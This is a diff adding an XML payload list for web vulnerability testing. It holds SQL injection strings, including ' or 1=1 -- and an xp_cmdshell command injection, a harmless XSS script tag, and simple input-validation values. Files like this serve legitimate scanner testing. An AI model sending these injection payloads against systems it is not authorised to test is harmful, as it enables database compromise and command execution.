@@ -1,0 +1,78 @@
+﻿<?xml version="1.0" encoding="utf-8" ?> 
+
+<payloads>
+
+
+	<item>
+		<id>0</id>
+		<payloadName><![CDATA[SQL Injection #0 single quote]]></payloadName>	
+		<payloadData><![CDATA[']]></payloadData>
+		<description><![CDATA[Classic SQL injection query string]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	<item>
+		<id>1</id>
+		<payloadName><![CDATA[SQL Injection #1 or 1=1 --]]></payloadName>	
+		<payloadData><![CDATA[' or 1=1 --]]></payloadData>
+		<description><![CDATA[Classic SQL injection query string]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	<item>
+		<id>2</id>
+		<payloadName><![CDATA[XSS #1]]></payloadName>	
+		<payloadData><![CDATA[<script>document.write('test xss attack')</script>]]></payloadData>
+		<description><![CDATA[Test XSS attack]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	
+	<item>
+		<id>3</id>
+		<payloadName><![CDATA[SQL Injection #3 XP_cmdShell]]></payloadName>	
+		<payloadData><![CDATA['; exec master..XP_cmdShell dir--]]></payloadData>
+		<description><![CDATA[Sql Injection 2]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	
+	<item>
+		<id>4</id>
+		<payloadName><![CDATA[SQL Injection #2 Single Quote]]></payloadName>	
+		<payloadData><![CDATA[']]></payloadData>
+		<description><![CDATA[Quote to detect SQL vunerability]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	
+	<item>
+		<id>5</id>
+		<payloadName><![CDATA[Query String]]></payloadName>	
+		<payloadData><![CDATA[id=-]]></payloadData>
+		<description><![CDATA[Querystring]]></description>
+		<type><![CDATA[5]]></type>
+	</item>
+	
+	
+	<item>
+		<id>6</id>
+		<payloadName><![CDATA[Test non Numeric]]></payloadName>	
+		<payloadData><![CDATA[a]]></payloadData>
+		<description><![CDATA[For testing numeric validation]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	
+	<item>
+		<id>7</id>
+		<payloadName><![CDATA[Negative Number]]></payloadName>	
+		<payloadData><![CDATA[-1]]></payloadData>
+		<description><![CDATA[For testing numeric validation]]></description>
+		<type><![CDATA[1]]></type>
+	</item>
+	
+	
+	
+
+</payloads>
